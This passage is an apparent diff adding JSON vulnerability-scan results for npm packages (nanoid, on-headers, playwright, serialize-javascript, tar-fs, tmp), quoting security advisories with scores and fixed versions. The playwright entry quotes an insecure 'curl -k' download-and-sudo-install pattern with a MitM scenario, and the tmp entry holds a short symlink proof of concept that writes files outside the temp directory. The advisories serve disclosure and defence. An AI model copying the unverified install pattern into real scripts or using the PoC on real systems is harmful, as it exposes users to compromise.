+                  "type": "PACKAGE",
+                  "url": "https://github.com/ai/nanoid"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+                }
+              ],
+              "related": [
+                "CGA-7vvh-vj96-x4xv",
+                "CGA-8vh7-wwpf-5f4g",
+                "CGA-cr3m-qfmj-rhf8",
+                "CGA-q99g-63m8-c4r8"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Predictable results in nanoid generation when given non-integer values"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "on-headers",
+            "version": "1.0.2",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-76c9-3jph-rj3q"
+              ],
+              "aliases": [
+                "CVE-2025-7339",
+                "GHSA-76c9-3jph-rj3q"
+              ],
+              "max_severity": "3.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-76c9-3jph-rj3q/GHSA-76c9-3jph-rj3q.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "on-headers",
+                    "purl": "pkg:npm/on-headers"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.1.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-7339"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-241"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-17T21:17:19Z",
+                "nvd_published_at": "2025-07-17T16:15:35Z",
+                "severity": "LOW"
+              },
+              "details": "### Impact\n\nA bug in on-headers versions `\u003c 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`\n\n### Patches\n\nUsers should upgrade to `1.1.0`\n\n### Workarounds\n\nUses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array.",
+              "id": "GHSA-76c9-3jph-rj3q",
+              "modified": "2025-07-17T21:44:33.423834Z",
+              "published": "2025-07-17T21:17:19Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/jshttp/on-headers/security/advisories/GHSA-76c9-3jph-rj3q"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7339"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/expressjs/morgan/issues/315"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/jshttp/on-headers/issues/15"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/jshttp/on-headers/commit/c6e384908c9c6127d18831d16ab0bd96e1231867"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/jshttp/on-headers"
+                }
+              ],
+              "related": [
+                "CGA-6cvc-q4pg-m73c",
+                "CGA-7ccg-jm7q-gwxv",
+                "CGA-fmg2-47pm-f9hf",
+                "CGA-h46m-gpr2-3pf5"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "on-headers is vulnerable to http response header manipulation"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "playwright",
+            "version": "1.54.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-7mvr-c777-76hp"
+              ],
+              "aliases": [
+                "CVE-2025-59288",
+                "GHSA-7mvr-c777-76hp"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-7mvr-c777-76hp/GHSA-7mvr-c777-76hp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "playwright",
+                    "purl": "pkg:npm/playwright"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.55.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-59288"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-347"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-10-20T14:19:32Z",
+                "nvd_published_at": "2025-10-14T17:16:11Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\nUse of `curl` with the `-k` (or `--insecure`) flag in installer scripts allows attackers to deliver arbitrary executables via Man-in-the-Middle (MitM) attacks. This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./\u003cpkg-file\u003e -k \u003curl\u003e\nsudo installer -pkg /tmp/\u003cpkg-file\u003e -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send\u0026utm_medium=member_desktop_web\u0026rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)",
+              "id": "GHSA-7mvr-c777-76hp",
+              "modified": "2025-10-24T20:05:47Z",
+              "published": "2025-10-14T18:30:36Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59288"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/microsoft/playwright/pull/37532"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/microsoft/playwright"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/microsoft/playwright/releases/tag/v1.55.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/microsoft/playwright/releases/tag/v1.56.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288"
+                }
+              ],
+              "related": [
+                "CGA-8r6x-v3mm-9262"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Playwright downloads and installs browsers without verifying the authenticity of the SSL certificate"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "serialize-javascript",
+            "version": "6.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-76p7-773f-r4q5"
+              ],
+              "aliases": [
+                "CVE-2024-11831",
+                "GHSA-76p7-773f-r4q5"
+              ],
+              "max_severity": "5.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-76p7-773f-r4q5/GHSA-76p7-773f-r4q5.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "serialize-javascript",
+                    "purl": "pkg:npm/serialize-javascript"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "6.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-11831"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-10T21:19:59Z",
+                "nvd_published_at": "2025-02-10T16:15:37Z",
+                "severity": "MODERATE"
+              },
+              "details": "A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.",
+              "id": "GHSA-76p7-773f-r4q5",
+              "modified": "2025-11-28T21:46:28.307741Z",
+              "published": "2025-02-10T18:30:47Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-11831"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/pull/173"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/7f3ac252d86b802454cb43782820aea2e0f6dc25"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yahoo/serialize-javascript"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2312579"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/security/cve/CVE-2024-11831"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:9294"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8551"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8544"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8512"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8479"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8233"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8078"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8059"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:4511"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:3870"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:21203"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:21068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:1468"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:1334"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:10853"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:0381"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHBA-2025:0304"
+                }
+              ],
+              "related": [
+                "CGA-72hf-gjp2-m4hx"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Cross-site Scripting (XSS) in serialize-javascript"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar-fs",
+            "version": "1.16.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "aliases": [
+                "CVE-2025-59343",
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-59343"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-61"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-24T18:57:04Z",
+                "nvd_published_at": "2025-09-24T18:15:42Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+              "id": "GHSA-vj76-c3g6-qr5v",
+              "modified": "2025-11-03T21:34:35Z",
+              "published": "2025-09-24T18:57:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59343"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html"
+                }
+              ],
+              "related": [
+                "CGA-3xxp-rpv6-8q3v",
+                "CGA-629w-fchm-c48f",
+                "CGA-9rx8-9xvv-cx6w",
+                "CGA-jjrf-7cgq-346h",
+                "CGA-x8c2-72cm-877v"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar-fs",
+            "version": "2.1.3",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "aliases": [
+                "CVE-2025-59343",
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-59343"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-61"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-24T18:57:04Z",
+                "nvd_published_at": "2025-09-24T18:15:42Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+              "id": "GHSA-vj76-c3g6-qr5v",
+              "modified": "2025-11-03T21:34:35Z",
+              "published": "2025-09-24T18:57:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59343"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html"
+                }
+              ],
+              "related": [
+                "CGA-3xxp-rpv6-8q3v",
+                "CGA-629w-fchm-c48f",
+                "CGA-9rx8-9xvv-cx6w",
+                "CGA-jjrf-7cgq-346h",
+                "CGA-x8c2-72cm-877v"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tmp",
+            "version": "0.2.3",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "aliases": [
+                "CVE-2025-54798",
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "max_severity": "2.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.2.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-52f5-9888-hmc6/GHSA-52f5-9888-hmc6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tmp",
+                    "purl": "pkg:npm/tmp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.2.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-54798"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-08-06T17:06:04Z",
+                "nvd_published_at": "2025-08-07T01:15:26Z",
+                "severity": "LOW"
+              },
+              "details": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //\u003c-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .\u003cname\u003e or ..\u003cname\u003e or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) \u0026\u0026 !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //\u003c--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+              "id": "GHSA-52f5-9888-hmc6",
+              "modified": "2025-11-03T21:34:20Z",
+              "published": "2025-08-06T17:06:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54798"
+                },
+                {
